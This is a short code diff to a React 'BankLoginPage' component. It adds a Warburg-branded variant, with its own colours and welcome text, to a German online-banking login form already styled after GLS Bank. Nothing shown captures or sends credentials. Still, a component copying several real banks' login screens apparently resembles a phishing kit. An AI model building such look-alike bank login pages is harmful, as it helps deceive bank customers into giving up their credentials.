@@ -603,13 +603,18 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
         <div className="w-full lg:w-1/2 flex flex-col gap-4">
           <div className="bg-white shadow-md border border-gray-200 overflow-hidden" style={{ borderRadius: theme.buttonRadius === "rounded-none" ? "0px" : "12px" }}>
             <div className="p-6 sm:p-8">
-              {isGLS ? (
+              {isGLS || isWarburg ? (
                 <div className="flex flex-col mb-6">
-                  <h2 className="text-3xl font-bold mb-6 text-[#002864]">
+                  <h2 className={`text-3xl font-bold mb-6 ${isGLS ? "text-[#002864]" : "text-gray-600"}`}>
                     Anmelden
                   </h2>
+                  {isWarburg && (
+                    <p className="text-sm text-gray-700 mb-6">
+                      Herzlich willkommen zum {bank?.name} Onlinebanking
+                    </p>
+                  )}
                   <div className="flex border-b border-gray-200 mb-6">
-                    <button type="button" className="px-1 pb-3 text-sm font-bold text-[#002864] border-b-2 border-[#002864]">
+                    <button type="button" className={`px-1 pb-3 text-sm font-bold border-b-2 ${isGLS ? "text-[#002864] border-[#002864]" : "text-gray-600 border-gray-600"}`}>
                       Mit Zugangsdaten anmelden
                     </button>
                     <button type="button" className="px-6 pb-3 text-sm font-bold text-gray-400 hover:text-gray-600">
@@ -618,6 +623,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                   </div>
                 </div>
               ) : (
+
                 <>
                   <h2 className="text-2xl sm:text-3xl font-bold mb-4" style={{ color: themeColor }}>
                     Anmelden
